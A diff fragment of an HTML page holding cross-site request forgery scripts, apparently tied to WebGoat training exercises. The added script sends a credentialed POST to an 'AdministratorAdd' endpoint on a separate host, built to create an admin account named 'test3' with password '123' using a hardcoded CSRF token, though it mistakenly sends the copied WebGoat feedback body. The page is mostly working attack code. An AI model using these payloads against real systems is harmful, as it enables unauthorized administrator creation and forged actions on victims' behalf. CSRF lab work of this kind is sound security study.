@@ -77,6 +77,14 @@
       xhr.open('POST', 'http://18.214.61.110:8888/WebGoat/csrf/feedback/message', true);
       xhr.send('%7B%0A%20%20%22name%22%20%20%20%20%3A%20%22WebGoat%22%2C%0A%20%20%22email%22%20%20%20%3A%20%22webgoat%40webgoat.org%22%2C%0A%20%20%22content%22%20%3A%20%22WebGoat%20is%20the%20best!!%22%0A%7D');
   </script>
+  <script>       
+      var req = new XMLHttpRequest();
+      var data='data={"enabled":true,"login":"test3","display_name":"Admin","description":"123","profile_id":1,"password":"123"}&id=false&csrfmiddlewaretoken=DAAE09FDF3F94C9EF1FB3D41'
+      req.open('POST', 'http://169.254.130.11:8001/administrators/AdministratorAdd', true);
+      req.withCredentials = true;
+      req.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+      req.send('%7B%0A%20%20%22name%22%20%20%20%20%3A%20%22WebGoat%22%2C%0A%20%20%22email%22%20%20%20%3A%20%22webgoat%40webgoat.org%22%2C%0A%20%20%22content%22%20%3A%20%22WebGoat%20is%20the%20best!!%22%0A%7D');
+  </script>
   <!-- <script>document.getElementById('lesson2').submit(); </script>  onload=document.getElementById('cat').submit(); Для автоматизации submit-->
 </html>
 
